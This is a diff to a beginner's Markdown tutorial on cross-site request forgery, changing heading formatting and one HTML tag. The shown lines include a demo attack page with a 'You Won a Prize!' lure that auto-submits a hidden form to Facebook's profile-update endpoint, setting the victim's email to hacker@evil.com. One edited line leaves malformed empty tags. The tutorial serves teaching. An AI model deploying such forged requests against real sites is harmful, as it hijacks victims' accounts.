@@ -1,7 +1,7 @@
 #CSRF(Cross-Site-Request-Frogery)
 
 
-## first what is the CSRF (Cross-Site-Request-Forgery)
+##first what is the CSRF (Cross-Site-Request-Forgery)
 
 **Cross-site request forgery (CSRF):**CSRF is an attack where a malicious website tricks your browser into sending unwanted,
 authenticated requests to another site where you’re already logged in.
@@ -132,7 +132,7 @@ _you open facebook and a any of web that give you any **cracking service's** or 
  <head>
     <title>You Won a Prize!</title>
  </head>
-  <body onload="document.forms[0].submit()"> <h1>مبروك! كسبت جايزة، جاري التحميل...</h1>
+  <body onload="document.forms[0].submit()"> <>مبروك! كسبت جايزة، جاري التحميل...</>
     <form action="http://facebook.com/update-profile.php" method="POST" style="display:none;">        
         <input type="hidden" name="email" value="hacker@evil.com">       
     </form>
@@ -140,7 +140,7 @@ _you open facebook and a any of web that give you any **cracking service's** or 
 </html>
 
 
-###okay what is happen in there**
+###okay what is happen in there
 if facebook don't use csrf token's just cookie's your email the was be changed,
 because your browser had saved your cookies from last login,
 every time you open facebook you don't need to login because the browser had saved your cookies,
